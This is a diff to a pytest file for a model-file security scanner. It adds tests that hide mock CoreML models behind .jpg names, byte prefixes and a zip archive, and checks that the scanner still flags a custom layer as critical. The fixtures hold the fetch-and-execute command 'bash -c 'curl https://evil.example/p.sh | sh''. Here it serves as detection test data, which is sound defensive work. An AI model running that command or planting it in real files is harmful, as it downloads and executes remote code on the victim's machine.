@@ -1787,16 +1787,39 @@ def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
     )
 
 
-def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Path) -> None:
+@pytest.mark.parametrize("prefix", [b"", b"\x9a\x06\x03pad", b"\x9b\x06\x08\x01\x9c\x06"])
+def test_scan_file_routes_misnamed_coreml_and_detects_custom_layer(tmp_path: Path, prefix: bytes) -> None:
     disguised_coreml = create_mock_coreml(
         tmp_path / "malicious.jpg",
         custom_class="EvilRuntimeLayer",
         custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
     )
+    disguised_coreml.write_bytes(prefix + disguised_coreml.read_bytes())
 
     result = scan_file(str(disguised_coreml), config={"cache_scan_results": False})
 
     assert result.scanner_name == "coreml"
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
+        for issue in result.issues
+    )
+
+
+@pytest.mark.parametrize("prefix", [b"\x9a\x06\x03pad", b"\x9b\x06\x08\x01\x9c\x06"])
+def test_scan_file_routes_prefixed_misnamed_coreml_nested_in_zip(tmp_path: Path, prefix: bytes) -> None:
+    nested_coreml = create_mock_coreml(
+        tmp_path / "nested.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    nested_coreml.write_bytes(prefix + nested_coreml.read_bytes())
+    archive_path = tmp_path / "bundle.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.write(nested_coreml, arcname="models/nested.jpg")
+
+    result = scan_file(str(archive_path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "zip"
     assert any(
         issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
         for issue in result.issues
